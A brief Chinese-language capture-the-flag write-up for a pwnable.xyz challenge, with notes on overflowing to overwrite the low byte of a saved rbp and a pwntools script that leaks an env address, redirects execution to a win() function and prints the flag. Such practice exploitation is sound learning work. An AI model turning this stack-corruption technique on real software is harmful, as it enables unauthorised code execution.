思路：

- 通过溢出修改rbp
- 计算offset，实现栈上数据的修改



TODO：env与rbp的偏移值在不同机器上的区别？



脚本：

```
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

e = ELF('./challenge')
win_addr = e.symbols['win']
print('win address:' + hex(win_addr))


def solve():
    p = remote('svc.pwnable.xyz', 30012)
    # p = process('./challenge')

    p.sendlineafter(b'> ', b'3')
    env_addr = int(p.recvuntil(b'Me')[:-3], 16)

    # 本地与远程不一样
    # rbp = env_addr - 0x108
    rbp = env_addr - 0xf8
    print('env address:' + hex(env_addr))
    print('rbp:' + hex(rbp))

    lowest_byte = rbp & 0xff
    new_byte = lowest_byte + 9
    print('lowest byte:' + hex(new_byte))
    p.sendafter(b'> ', (b' ' * 0x20) + p8(new_byte))
    p.sendlineafter(b'> ', str.encode(str(win_addr & 0xff)))

    # gdb.attach(p)
    p.sendafter(b'> ', (b' ' * 0x20) + p8(lowest_byte))

    p.sendafter(b'> ', b'1')

    # p.interactive()
    recv = p.recv().decode('utf-8')
    p.close()
    if 'flag' in recv.lower():
        print(recv)
        return True
    return False


solve()

```

